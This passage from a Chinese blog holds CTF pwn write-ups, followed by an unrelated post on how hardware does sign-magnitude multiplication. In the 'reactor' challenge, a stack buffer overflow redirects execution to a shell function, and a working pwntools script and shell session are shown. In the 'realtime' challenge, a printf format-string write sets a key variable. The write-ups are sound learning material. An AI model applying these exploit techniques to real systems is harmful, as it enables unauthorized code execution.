<p>然后<code>[ebp-0x50,ebp-0x8)</code>这78个字符都随便溢出,</p>
<p>然后i溢出成最大正数<code>0x7fffffff</code></p>
<p>结果这样打不通</p>
<p>原因是,<code>for ( i = 0; ; ++i )</code>在循环一开始
的时候有一个<code>i=0</code>这个是在代码段里的,这打死也改不了</p>
<p>也就是在执行到这里的时候,我们的payload变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(&#x27;a&#x27;*32).encode()+p32(0x080486cc)+(&#x27;a&#x27;*0x48).encode()+p32(0x0)</span><br></pre></td></tr></table></figure>
<p>i改了也白改,因为v2获取输入发生在循环之前,进入循环的时候又要i=0初始化循环变量</p>
<h4 id="错误2">错误2</h4>
<p>那么此时把前32个字符改成'A'企图用老方法绕过每次判断函数还可以吗?也不行</p>
<p>因为<code>('a'*0x48)</code>这里我们已经把v5溢出成<code>a</code>(ascii码为97)了,最后出了循环的时候执行的是<code>((void (*)(void))v3[96])();</code>显然这对于v3指针数组来说已经访问越界了</p>
<h4 id="错误3">错误3</h4>
<p>直接不管main函数的所有逻辑,溢出main的返回地址,改成<code>0x80486cc</code>可以吗</p>
<p>即payload这样写:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>).encode()+p32(<span class="number">0x80486CC</span>)</span><br></pre></td></tr></table></figure>
<p>前面<code>0x78</code>个字节啥也不管全都乱写,最后返回地址r溢出成<code>0x80486CC</code></p>
<p>这样写也不行,因为中间将<code>v3</code>那个指针数组溢出毁了,所有的指针都指向<code>0x97</code>这个位置,而这个位置显然不在程序的虚拟地址空间里面(本程序的虚拟地址空间从<code>0x08048000</code>开始).这个位置指的是谁呢?我反正不知道,也不想知道.反正发生了段错误.还没等到main函数返回时程序就因为段错误结束运行了</p>
<h2 id="反应釜开关控制">反应釜开关控制</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619233350713.png"
alt="image-20220619233350713" />
<figcaption aria-hidden="true">image-20220619233350713</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\reactor&gt; checksec reactor      [*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\reactor\\reactor&#x27;</span>           Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>有一个shell函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是没有调用者,需要溢出主函数的返回地址,改成shell的地址<code>4005F6</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">512</span>]; <span class="comment">// [rsp+40h] [rbp-200h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please closing the reaction kettle\n&quot;</span>, <span class="number">0x23</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, easy);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  gets(v5);<span class="comment">//此处存在栈缓冲区溢出攻击</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000200 v5              db 512 dup(?)</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>前512+8=520个字节随便溢出</p>
<p>后面八个字节溢出成shell函数的地址<code>0x4005F6</code></p>
<p>属实有点儿弱智了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./reactor&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">520</span>*<span class="string">&#x27;a&#x27;</span>).encode()+p64(<span class="number">0x4005f6</span>);</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/reactor]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./reactor&#x27;</span>: pid 44                                                                                                                                    </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">kali</span><br></pre></td></tr></table></figure>
<p><code>cyberpeace&#123;a6053fab9ffe26d2ddc53ce7f78e08be&#125;</code></p>
<h2 id="实时数据监测">实时数据监测</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/realtime]</span><br><span class="line">└─$ checksec realtime</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/realtime/realtime&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>主函数只调用了一共<code>locker</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">locker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [esp+0h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  imagemagic(s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">35795746</span> )<span class="comment">//如果key=3579576=0x2223322,看来需要溢出改变</span></span><br><span class="line">    result = system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键函数在<code>imagemagic(s);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">imagemagic</span><span class="params">(<span class="type">char</span> *format)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>存在<code>printf</code>格式化字符串漏洞,<code>format</code>来自<code>locker</code>中的<code>s,s</code>来自<code>stdin</code>键盘输入,长度<code>512</code>个字节,足够写入负载了</p>
<p>首先要确定<code>printf</code>时,格式化字符串参数在栈上什么地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./realtime&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&quot;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/realtime]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./realtime&#x27;</span>: pid 77                                                                                                                                   </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./realtime&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 77)</span><br><span class="line">AAAA-0xf7f5ace0-0xff8a6a84-(nil)-0x1-0x80483a0-0xff8a6a28-0x80484e7-0xff8a6820-0x200-0xf7f2b580-(nil)-0x41414141-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d</span><br><span class="line">The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<p><code>0x41414141</code>是栈上第12个参数,现在可以用key的地址<code>0x804A048</code>替代<code>AAAA</code>,然后用<code>payload=p32(0x0804A048)+('%035795742c%12$n').encode()</code>将<code>4+035795742</code>写到第12个参数上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./realtime&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x0804A048</span>)+(<span class="string">&#x27;%035795742c%16$n&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>运行之后终端上会输出<code>035795746</code>个空格,需要等好长好长时间,才轮到我们与终端交互</p>
<p>有没有温柔一些的方法呢?</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/17/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/17/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">机器级算术运算的原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-17 12:20:00 / Modified: 12:24:34" itemprop="dateCreated datePublished" datetime="2022-06-17T12:20:00+08:00">2022-06-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="机器级算术运算的原理">机器级算术运算的原理</h1>
<p>落脚在加法,全加器,半加器,全加器级联,等最基础的知识</p>
<p>机器在算术的时候有很多行为和人不一样,但是权位的思想是相同的</p>
<p>人在算术的时候通过列竖式对其的方式,隐含着权位规则.</p>
<p><strong>机器将权位规则体现在,随着运算会有中间结果的位移</strong></p>
<p>理解了机器将中间结果移位的原因,也就理解了机器级算术运算的原理</p>
<p>计组第三章讲的机器机计算方法实际上和程序员距离比较远,ALU中已经封装好了各种计算方法,那为什么还要我们学这一部分呢?</p>
<p>我的感觉让我们是理解计算机底层实现中的状态机思想,</p>
<p>在推导适应机器的算法时,越发感觉出,有固定的状态的转移套路</p>
<p>而这种思想将对我们在开发状态机服务端的时候提供世界观上的支持</p>
<p>然而课本对于该部分的介绍基本止步于如何计算,并没有下到算法如何设计得到的,可以说是一大遗憾.</p>
<p>现在将我的设计和课本给出的设计思想其补上</p>
<h2 id="手算原码乘法">手算原码乘法</h2>
<p>这是万恶之源,通过一个例题观察人类对权位规则的应用</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617122401353.png"
alt="image-20220617122401353" />
<figcaption aria-hidden="true">image-20220617122401353</figcaption>
</figure>
<p>之前一直不知道怎么描述这个过程,只能是手写比划比划,直到看了CSAPP第二章位向量表示法,终于知道怎么描述这个过程了</p>
<p>只看小数点后面的部分,把<span
class="math inline">\(X,Y\)</span>表示成位向量,有 <span
class="math display">\[
X=[X_3X_2X_1X_0]=\sum_{i=0}^3[2^i\times X_i](X_i=0\ or\ 1)
\]</span></p>
<p><span class="math display">\[
Y=[Y_3Y_2Y_1Y_0]=\sum_{i=0}^3[2^i\times Y_i](Y_i=0\ or\ 1)
\]</span></p>
<p>那么手算的思想可以用下式表示: <span class="math display">\[
\begin{aligned}
ANS&amp;=X\times Y\\
&amp;=X\times\sum_{i=0}^3[2^i\times Y_i]\\
&amp;=\sum_{i=0}^3[ 2^i\times X\times Y_i]\\
&amp;=[X\times Y_0]+2[X\times Y_1]+4[X\times Y_2]+8[X\times Y_3]\\
&amp;=A_0+A_1+A_2+A_3\\
&amp;=E\\
&amp;=[E_3E_2E_1E_0]
\end{aligned}
\]</span> 其中 <span class="math display">\[
A_i=2^i\times [X\times Y_i],i\in[0,3]
\]</span></p>
<p><span class="math display">\[
E_j=\sum_{i=0}^3A_{ij}+低位进位\\
j\in[0,7]\
\]</span> <img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616210922544.png"
alt="image-20220616210922544" /></p>
<p>这里<span
class="math inline">\(E_i\)</span>的计算方法就是小学里算竖式的时候,老师常说的"落下来"</p>
<p>从图上我们可以更清晰地看出,被乘数分别和乘数的"个十百千位"相乘,按位对其之后落下来累加得到E</p>
<h2 id="原码一位乘法">原码一位乘法</h2>
<p>如果让机器原封不动重复刚才手算的过程</p>
<h3 id="替机器瞎操心">替机器瞎操心</h3>
<p>他需要维护一个二维数组,记录用X和Y的每一位相乘,分别得到的中间位向量<span
class="math inline">\(A_i\)</span></p>
<p>然后"落下来"求<span class="math inline">\(E\)</span></p>
<p>就这个二维数组就把机器难为住了</p>
<p>1.如果两个32位整数相乘,就需要32*32个方格的二维数组,ALU可是没有记忆功能的,寄存器也就稀松几个,记忆能力有限,显然32²个方格没处放.</p>
<p>2.机器怎么知道当前应该用X对齐Y的"个位"还是"十位"还是"百位"呢?用一个寄存器,记录Y已经被对齐过几位吗?</p>
<p>不需要,因为本次对齐的位一定是只比上一次对齐位高一位,只需要将被乘数左移一下.</p>
<p>然后根据本次Y的对齐位是1则<span class="math inline">\(Ai=X\times
权重\)</span>,比如图表中<span class="math inline">\(A_3\)</span></p>
<p>如果本次Y的对齐位为0则<span
class="math inline">\(A_i=0\)</span>,比如图表中<span
class="math inline">\(A_2\)</span></p>
<p>问题又来了,权重用谁来记住呢?再开一个寄存器,初始记录1,表示权重为<span
class="math inline">\(2^0\)</span>,随着被乘数<span
class="math inline">\(X\)</span>的左移,这个寄存器也要左移一下表示权重乘以2</p>
<p>如果继续研究如何让硬件实现,还能发现更多问题.<del>第一,机器算账,这钱怎么进了你自己的腰包</del></p>
<h3 id="滚动数组">滚动数组</h3>
<p>现在考虑一下,有必要维护这个二维数组吗?滚动数组行吗?</p>
<p>中间过程不使用二维数组,就维护一个位向量<span
class="math inline">\(A\)</span>,计算过程中A只有累加和右移两种行为.</p>
<p>乘数个位为1,则被乘数直接加到A的<strong>高四位</strong></p>
<blockquote>
<p>为啥是高四位呢?似乎有点违反直觉,因为A的高位表示的是高权重,但是现在用被乘数乘的是乘数的个位,权位最低才对啊.别忘了A要右移</p>
</blockquote>
<p>然后A右移一位,乘数右移一位</p>
<blockquote>
<p>这个过程干了一个啥事呢?</p>
<p>被乘数一直和乘数的"最低位"对齐,刚才最低位是"个位",现在经过右移,个位直接扬了,十位成了"最低位".被乘数时钟看乘数最低位脸色行事,当这个最低位是1的时候才把自己加到A上,加到A的最高四位上</p>
<p>A右移一位,则所有历史记录都降权2,</p>
<p>可想而知,当乘数的千位右移到最低位,这时候被乘数将自己加到了A的高四位上,此时计算结束.乘数的千位和被乘数的积
的权就最高,根本不需要降权</p>
<p>而乘数的个位和被乘数的积此时已经经历了4次降权,权重仅为<span
class="math inline">\(\frac{1}{2^4}=\frac{1}{16}\)</span></p>
<p>这正好满足我们的目的</p>
</blockquote>
<p>现在可以用机器实现了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616213145320.png"
alt="image-20220616213145320" />
<figcaption aria-hidden="true">image-20220616213145320</figcaption>
</figure>
<h4 id="硬件框图的意义">硬件框图的意义</h4>
<p>这个图怎么看呢?</p>
<p>D和A合起来作为"中间过程位向量",D就是高四位,A就是低四位</p>
<p>一开始的时候D=0,A=Y,这好像和我们刚才的分析不一样,我们分析的滚动数组思想中,Y是独立存在的,不会放在A中.</p>
<p>而实际上Y需要独立存在吗?考虑每次被乘数要么不加,要么加到高四位上,而Y一开始放在低四位,两者不会相互影响.</p>
<p>随着这个中间过程位向量不断右移,Y被一位一位移除了A,当Y恰好移出的时候计算恰好结束.</p>
<p><span
class="math inline">\(A_0\)</span>就是乘数的"最低位",随着乘数Y的不断右移,硬件A的最低位会以此存放Y的个十百千位,相当于将Y遍历了一遍</p>
<p>"被乘数看乘数最低位颜色决定加不加"这个事怎么实现的呢?</p>
<p>用一个B寄存器存放被加数X,X和0作为二选一选择器的数据段,<span
class="math inline">\(A_0\)</span>作为该二选一的地址端,当<span
class="math inline">\(A_0=1\)</span>则选通X,当<span
class="math inline">\(A_0=0\)</span>则选通0</p>
<p>选通的信号就进入了<span
class="math inline">\(\Sigma\)</span>多位加法器</p>
<p>左上角这个循环干了啥事呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616213859376.png"
alt="image-20220616213859376" />
<figcaption aria-hidden="true">image-20220616213859376</figcaption>
</figure>
<p>被加数总是加到中间过程位向量的高四位,这怎么实现?将旧的高四位作为加数和X相加就得到了新的高四位</p>
<p>这个半调子CF是干啥的呢?</p>
<p>CF是PSW程序状态字中的一位,用来记录是否有进位,啥时候会有进位呢?</p>
<p>比如头一次D=1111,右移变成0111,然后下一次又加了1111,显然0111+1111溢出了,但是顶多溢出一位,于是放到CF里,然后D右移的时候,再从CF里拿出来放到D里</p>
<h3 id="手写模拟">手写模拟</h3>
<p>模拟机器计算<span class="math inline">\(0.1101\times
1.1011\)</span>(都是原码)</p>
<p>符号显然同号得负数,这对机器来说也是小菜一碟,两符号娶个异或即可</p>
<p>去掉小数点,后面的直接作为整数乘法,怎么乘的呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616215950459.png"
alt="image-20220616215950459" />
<figcaption aria-hidden="true">image-20220616215950459</figcaption>
</figure>
<p>最左侧这里列也是有实际意义的,里面是CF位的状态.</p>
<p>这一点课本并没有给出,这导致我一开始认为只有手算模拟才会用到这一列</p>
<p>乘数有四位,因此共有四次操作,恰好将Y从A中扬了,中间结果积逐渐充斥整个D和A</p>
<blockquote>
<p>这个过程要是找个现实中的类比的话,可以举这么一个不恰当的例子:</p>
<p>一个公司有10个部长,资本家的总是嫌这十个人好吃懒惰不干活,或者说即使比较勤奋,但是不想再给他发太多工资,直接降薪吧人家也不愿意.反正就是想找个理由踢了这是个人换成新人</p>
<p>但是资本家还不敢一口气全体了,这会造成一段时间没人管事儿.</p>
<p>于是资本家想了一个温水煮癞蛤蟆的方法,每隔一个月从这10个人里找一个业绩最差的,</p>
<p>要是他真的好吃懒惰啥也不干,直接踢了,公司正常运转.</p>
<p>要是他确实负责一些事情,那么找一个能干的新人把他挤了,公司正常运转</p>
<p>10个月后,10个部长就全是优秀并且高效的00后了</p>
</blockquote>
<h4 id="无符号右移">无符号右移?</h4>
<p>关于"无符号右移",这个事情发生在</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616220805565.png"
alt="image-20220616220805565" />
<figcaption aria-hidden="true">image-20220616220805565</figcaption>
</figure>
<table>
<thead>
<tr>
<th>原数</th>
<th>带符号右移结果</th>
<th>无符号右移结果</th>
</tr>
</thead>
<tbody>
<tr>
<td><span class="math inline">\(1&#39;0011&#39;1101\)</span></td>
<td><span class="math inline">\(1&#39;1001&#39;1110\)</span></td>
<td><span class="math inline">\(0&#39;1001&#39;1110\)</span></td>
</tr>
</tbody>
</table>
<p>显然正确的计算方法是无符号右移,为啥不是带符号的呢?</p>
<p>首先,带符号意味着负数,而我们整个计算过程中要么加0,要么加x,反正不会加一个负数,理论上就不存在加负数的情况</p>
<p>再者,这里最左侧的"符号"实际上是CF位,是上一次加被乘数之后的进位,不是"符号",我们一直在进行无符号运算</p>
<h2 id="原码两位乘法">原码两位乘法</h2>
<h3 id="为啥要两位乘">为啥要两位乘?</h3>
<p>原码两位乘法和原码一位乘法的思想基本相同,但是设计硬件的那伙子人嫌一位乘法太慢,这就好比一个人上楼梯,每次上一个台阶嫌慢,非得上两个</p>
<p>为啥没有原码三位乘法?<del>一次上三个台阶这不扯蛋吗</del></p>
<p>因为计算机中的数据都占用偶数位,从来没有说有一个66位计算机,有一个63位计算机,有一个30位计算机.</p>
<p>实际存在的计算机都是64位,32位,这些位数都是2的幂次,为啥非要是2的幂次?方便使用二进制呗.为啥一定使用二进制?逻辑门高电位和低电位就两种状态呗</p>
<p>为啥没有原码四位乘法?32和64不也是4的倍数吗?</p>
<p>还要考虑一个复杂性问题</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616230513076.png"
alt="image-20220616230513076" />
<figcaption aria-hidden="true">image-20220616230513076</figcaption>
</figure>
<p>如图原码二位乘已经有<span
class="math inline">\(2^3=8\)</span>种情况了,要是原码四位乘,不考虑低位进位的情况至少这四位需要考虑,就已经有<span
class="math inline">\(2^4=16\)</span>种情况了,显然让ALU考虑多种情况也是需要记忆功能的</p>
<p>在记忆能力和速度都可以接收的范围内,只有原码一位乘和原码二位乘是可行的</p>
<h3 id="规则">规则</h3>
<p>两位乘怎么玩呢?</p>
<p>原来被乘数看乘数最低位的脸色行事,现在被乘数还要看次低位的脸色.真的太卑微了</p>
<p>最低位和次低位的权还不一样,次低位更狠,权更重.</p>
<p>为了更详细的描述这个意思,规定X和Y的位向量表示</p>
<p>X和Y都忽略小数点和符号位,小数点后面的直接作为一个整数</p>
<p><span class="math inline">\(X=X_3X_2X_1X_0\)</span></p>
<p><span class="math inline">\(Y=Y_3Y_2Y_1Y_0\)</span></p>
<p>现在最低位就是<span
class="math inline">\(Y_0\)</span>,次低位就是<span
class="math inline">\(Y_1\)</span>,随着Y不断右移,这两个位会遍历整个Y</p>
<p>当<span
class="math inline">\(Y_1Y_0=11=3(Dec)\)</span>需要向中间过程位向量上加三个被乘数X,</p>
<p>当<span
class="math inline">\(Y_1Y_0=10=2(Dec)\)</span>需要向中间过程位向量上加两个被乘数X</p>
<p>当<span
class="math inline">\(Y_1Y_0=01=1(Dec)\)</span>需要向中间过程位向量上加一个被乘数X</p>
<p>当<span class="math inline">\(Y_1Y_0=00=0(Dec)\)</span>啥也不加</p>
<p>啥也不加,加一个X都好说,加两个X通过将X左移一位×2也容易实现,但是这个半吊子3怎么办呢?</p>
<p><code>3=4-1</code>,啥意思呢?</p>
<p>先从中间过程位向量的高四位减去一个被乘数X,</p>
<p>然后右移两位,这导致刚才减去的X降权4(右移两位相当于除以4),</p>
<p>此时再向高四位加上一个被乘数X,这个刚加上的X的权就高,是刚才减去的X的四倍,</p>
<p>这样一减一加,相当于在上一步(刚才减一的那一步)往中间过程位向量上加上了3个X.</p>
<p>达到了我们的目的</p>
<p>当<span
class="math inline">\(Y_1Y_0=11\)</span>,这时候才会加3X,还有加2X,1X,0的时候,怎么区分多种状态呢?用一个flag开关</p>
<p>也就是下表中的C</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616231945745.png"
alt="image-20220616231945745" />
<figcaption aria-hidden="true">image-20220616231945745</figcaption>
</figure>
<p>这个表什么意思呢?</p>
<h4 id="我一开始的理解">我一开始的理解</h4>
<p><strong>(当然是错误的,但是有借鉴意义)</strong></p>
<p>刚才我们推导怎么实现加3X的时候,先减X,位移后再加上X,看上去顺理成章,确实解决了上一回合需要加3X这个问题,</p>
<p>但是同时引入了新问题,即</p>
<p><strong>位移后的本回合有本回合要做的事情,而你却在本回合处理了上回合要做的事情,那么本回合本来要做的事情啥时候做呢?</strong></p>
<blockquote>
<p>啥叫本回合应该做的事?</p>
<p>每个回合要做的事就是根据<strong>当前</strong>乘数最低两位的脸色决定往中间过程位向量上加几个X</p>
</blockquote>
<p>要么本回合开一个额外回合,在给上回合擦腚之后,先不忙着将乘数右移开启下一个回合,而是正式处理本回合的事.处理完了再右移开启下一回合</p>
<p>但是这样怎么让一个傻子CPU知道这一次有没有额外回合呢?</p>
<p>可以用标志位C.每个正式回合都根据乘数最低两位是否全1,设置C是否为1,</p>
<p>当回合开始的时候,让CPU先检查C开关是否打开,</p>
<p>​ 如果开着则先擦腚,然后C给他关上,</p>
<p>​
如果C关着(不管是本来就管着还是擦完腚关上的,一视同仁),则处理本回合事物</p>
<p>我确实一开始是这样想的,但是仔细观察法则表之后发现人家的想法和我不一样</p>
<h4 id="人家的想法"><strong>人家的想法</strong></h4>
<p>如果按照我的设想,当C为1的时候,不需要看<span
class="math inline">\(Y_1Y_0\)</span>的脸色,直接加X,然后C置零</p>
<p><strong>然而</strong>表中即使C为1也需要看<span
class="math inline">\(Y_{i+1}Y_{i}\)</span>的脸色</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233254740.png"
alt="image-20220616233254740" />
<figcaption aria-hidden="true">image-20220616233254740</figcaption>
</figure>
<p>那么人家的方法什么思想呢?</p>
<figure>
<img
